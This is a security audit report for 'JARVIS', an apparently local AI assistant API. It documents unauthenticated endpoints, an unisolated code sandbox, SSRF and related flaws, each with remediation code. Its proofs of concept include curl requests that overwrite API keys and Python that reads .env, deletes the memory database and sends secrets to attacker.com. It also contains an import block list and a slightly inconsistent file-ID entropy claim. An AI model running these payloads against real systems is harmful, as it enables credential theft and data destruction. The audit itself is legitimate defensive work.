# JARVIS — Security Findings

> **Historical snapshot:** Findings below have not been revalidated against the current workspace. Consult [SECURITY.md](SECURITY.md) for source-checked current limitations.

**Audit Date:** 2026-11-23  
**Severity Scale:** Critical / High / Medium / Low  
**Classification:** Confirmed Vulnerability | Potential Vulnerability | Architectural Risk

> [!CAUTION]
> This document contains security-sensitive findings. Do not share publicly before remediation.

---

## CRITICAL

### SEC-001 — No Authentication on Any API Endpoint

**Severity:** Critical  
**CWE:** CWE-306 (Missing Authentication for Critical Function)  
**Finding Reference:** F-001  

**Description:**  
The entire JARVIS API surface is completely unauthenticated. Any code or browser that can reach port 8765 can invoke all functionality with no identity verification.

**Affected Endpoints:**
- `POST /api/settings` — writes API keys to disk `.env`
- `POST /api/chat` — executes AI + tools + sandbox code
- `GET/DELETE /api/files/{filename}` — read/delete any generated/uploaded file
- `POST /api/local-actions/execute` — launches desktop applications
- `POST /api/coding/execute` — runs code in sandbox
- `GET /api/memory` — reads all stored user memories
- `GET /api/projects` — reads all projects

**Attack Vector:** Network (local), unauthenticated  

**Proof of Concept:**
```bash
# Overwrite API keys
curl -sX POST http://localhost:8765/api/settings \
  -H "Content-Type: application/json" \
  -d '{"geminiApiKey":"sk-attacker","groqApiKey":"sk-attacker"}'

# Read all conversation memory
curl http://localhost:8765/api/memory

# Execute code in "sandbox"
curl -sX POST http://localhost:8765/api/coding/execute \
  -H "Content-Type: application/json" \
  -d '{"code":"import os; print(os.environ)","language":"python"}'
```

**Remediation:**
1. Generate a random token at first startup, store in a local file / OS keychain
2. All API requests must present `X-JARVIS-Token: <token>` header
3. Implement as a FastAPI dependency injected on all routers:
```python
from fastapi import Security
from fastapi.security import APIKeyHeader
api_key_header = APIKeyHeader(name="X-JARVIS-Token")
async def verify_token(token: str = Security(api_key_header)):
    if not secrets.compare_digest(token, settings.local_api_token):
        raise HTTPException(status_code=401)
```

---

### SEC-002 — Code Sandbox Has No OS-Level Isolation

**Severity:** Critical  
**CWE:** CWE-284 (Improper Access Control), CWE-78 (OS Command Injection)  
**Finding Reference:** F-002  

**Description:**  
The Python code sandbox uses `python -I` to disable site-packages but does nothing to prevent:
- File system access (can read `.env`, API keys, all user files)
- Network access (can make HTTP requests, exfiltrate data)
- Process spawning (`subprocess.run`, `os.system`, `os.popen`)
- Library imports (`socket`, `subprocess`, `shutil`, `ctypes`)

**Proof of Concept:**
```python
# Sent to /api/coding/execute or via tool "execute_python_code":
import os, subprocess
# Read API keys:
print(open('.env').read())
# Delete files:
os.remove('data/jarvis_memory.db')
# Spawn processes:
subprocess.run(['cmd', '/c', 'whoami'])
# Network exfiltration:
import urllib.request
urllib.request.urlopen('http://attacker.com/?d=' + open('.env').read())
```

**Remediation (Short-term):**
1. AST pre-scan to block dangerous imports:
```python
BLOCKED_IMPORTS = {'os', 'subprocess', 'socket', 'shutil', 'ctypes', 
                   'importlib', 'builtins', 'sys', 'pathlib', 'tempfile'}
tree = ast.parse(code)
for node in ast.walk(tree):
    if isinstance(node, (ast.Import, ast.ImportFrom)):
        for alias in node.names:
            if alias.name.split('.')[0] in BLOCKED_IMPORTS:
                raise ValueError(f"Import '{alias.name}' is not permitted.")
```
2. Set `PATH=""` in subprocess env
3. Restrict `cwd` to temp dir only (already done)

**Remediation (Long-term):** Isolate execution in a Docker container or use Pyodide WASM.

---

### SEC-003 — Unauthenticated API Key Replacement

**Severity:** Critical  
**CWE:** CWE-287 (Improper Authentication), CWE-522 (Insufficiently Protected Credentials)  
**Finding Reference:** F-003  

**Description:**  
`POST /api/settings` with a JSON body containing `geminiApiKey` or `groqApiKey` will:
1. Replace the in-memory setting immediately (all subsequent requests use attacker key)
2. Write the new key to `backend/.env` on disk (persistent across restarts)

No authentication, no CSRF token, no confirmation.

**Remediation:** Require authentication (SEC-001). Additionally, consider requiring current-key confirmation before replacement.

---

## HIGH

### SEC-004 — SSRF via DNS Rebinding in `web_reader.py`

**Severity:** High  
**CWE:** CWE-918 (Server-Side Request Forgery)  
**Finding Reference:** F-004  

**Description:**  
`_is_private_host()` in `web_reader.py` correctly blocks explicit private IP literals but does NOT resolve domain names before checking. A domain resolving to `192.168.x.x` or `10.x.x.x` bypasses the check.

```python
except ValueError:
    return False   # BUG: should resolve and check here
```

**Attack Scenario:**
1. Attacker registers `internal.attacker.com` → DNS → `192.168.1.1`
2. AI model calls `read_webpage("http://internal.attacker.com/admin")`
3. JARVIS backend fetches the internal admin panel and returns its content

**Note:** `researcher.py`'s `is_safe_external_url()` correctly uses `socket.gethostbyname()` — apply the same fix to `web_reader.py`.

---

### SEC-005 — Confirmation Token Store Has No Expiry (Memory Leak + Stale Execution)

**Severity:** High  
**CWE:** CWE-613 (Insufficient Session Expiration)  
**Finding Reference:** F-005  

**Description:**  
`_PENDING_CONFIRMATIONS: dict[str, PendingConfirmation] = {}` stores pending action confirmations globally with no TTL. A confirmation token for `write_file` created days ago can still be executed by calling `/api/chat` with `confirmedActionId`.

**Remediation:**
```python
@dataclass
class PendingConfirmation:
    action_id: str
    tool_name: str
    arguments: dict[str, Any]
    label: str
    description: str
    created_at: float = field(default_factory=time.time)

CONFIRMATION_TTL_SECONDS = 60

def execute_confirmed_action(action_id: str) -> dict[str, Any]:
    pending = _PENDING_CONFIRMATIONS.pop(action_id, None)
    if not pending:
        raise OrchestratorError("Invalid or expired action confirmation token.", 404)
    if time.time() - pending.created_at > CONFIRMATION_TTL_SECONDS:
        raise OrchestratorError("Confirmation token expired.", 410)
    return execute_tool_call(pending.tool_name, pending.arguments)
```

---

### SEC-006 — `permission_mode` Accepts Arbitrary String Values

**Severity:** High  
**CWE:** CWE-20 (Improper Input Validation)  
**Finding Reference:** F-006  

**Description:**  
Permission enforcement uses `== "read_only"` comparisons only. Any value besides `"read_only"` bypasses the check:
```python
if getattr(settings, "permission_mode", "assisted") == "read_only":
    return CodeExecutionResponse(ok=False, stderr="disabled")
```
An unauthenticated call to `POST /api/settings` with `{"permissionMode": "full_control"}` enables all restricted operations.

**Remediation:**
```python
VALID_PERMISSION_MODES = {"read_only", "assisted", "full_control"}
if request.permission_mode not in VALID_PERMISSION_MODES:
    raise HTTPException(422, f"Invalid permission mode. Must be one of: {VALID_PERMISSION_MODES}")
```

---

### SEC-007 — Generated Files Served Unauthenticated Without Session Scoping

**Severity:** Medium-High  
**CWE:** CWE-284 (Improper Access Control)  
**Finding Reference:** F-013  

**Description:**  
Files generated by any session (PDFs, DOCX, PPTX, XLSX) are accessible via `/api/files/download/{filename}` with no authentication and no session verification. File names use a 6-character hex ID (`uuid4().hex[:8]`), which is guessable with ~16 million possibilities.

**Impact:** Files generated for one session can be downloaded by any other session or by an unauthenticated attacker.

---

## MEDIUM

### SEC-008 — No Cross-Session Isolation in Memory Store

**Severity:** Medium  
**CWE:** CWE-284 (Improper Access Control)  
**Finding Reference:** F-018  

**Description:**  
`session_id` is a client-supplied UUID used directly as a database key:
```python
def get_history(self, session_id: str | UUID, limit: int = 14) -> list[dict]:
    sid = str(session_id)
    # No verification that this session belongs to current user
    cursor = conn.execute("SELECT ... FROM messages WHERE session_id = ?", (sid,))
```

If JARVIS is ever accessed by multiple users on a shared network, one user can read another user's conversation history by guessing or observing a session UUID.

**Remediation:** In a local single-user context this is lower risk. For multi-user: add user identity binding to sessions.

---

### SEC-009 — API Keys Written to `.env` File Without Encryption

**Severity:** Medium  
**CWE:** CWE-312 (Cleartext Storage of Sensitive Information)  
**Finding Reference:** F-003 (related)  

**Description:**  
`_persist_env_key()` in `settings_api.py` writes API keys in plaintext to `backend/.env`. On Windows, this file is in the user home directory tree and readable by all processes running as the same user.

**Remediation:** At minimum, document this explicitly. Long-term: use OS keychain (Windows Credential Store / macOS Keychain) via the `keyring` library.

---

## LOW

### SEC-010 — `allow_headers=["*"]` in CORS May Be Overly Permissive

**Severity:** Low  
**CWE:** CWE-942 (Permissive Cross-domain Policy)  
**Finding Reference:** F-001 (related)  

**Description:**  
```python
app.add_middleware(CORSMiddleware, allow_headers=["*"])
```
When combined with `allow_credentials=True`, `allow_headers=["*"]` is accepted by browsers without issue, but it allows any custom header to be used in cross-origin requests. The more important concern is the lack of CSRF protection given `allow_credentials=True`.

**Remediation:** Restrict to: `allow_headers=["Content-Type", "X-JARVIS-Token", "Authorization"]`

---

## Security Controls That ARE Present and Working

| Control | Implementation | Assessment |
|---|---|---|
| Path traversal in file read | `_resolve_safe_path()` with `relative_to()` | ✅ Effective |
| Path traversal in file download | `Path(filename).name` strip + startswith check | ✅ Effective |
| `.env` file write protection | `path.name.startswith(".env")` block | ✅ Present |
| Application allowlist (local actions) | Hardcoded `LOCAL_APPS` tuple, app_id enum | ✅ Effective |
| SSRF in researcher | `socket.gethostbyname()` + private IP check | ✅ Effective |
| Sandbox temp directory | `tempfile.TemporaryDirectory()` | ✅ Present |
| Sandbox timeout | `subprocess.run(timeout=N)` | ✅ Present |
| Calculator AST safety | Custom `_eval_node()` whitelist | ✅ Effective |
| Secret sanitization in diagnostics | `validate_configuration()` returns no keys | ✅ Effective |
| CORS origin restriction | Specific origin list | ✅ Present |
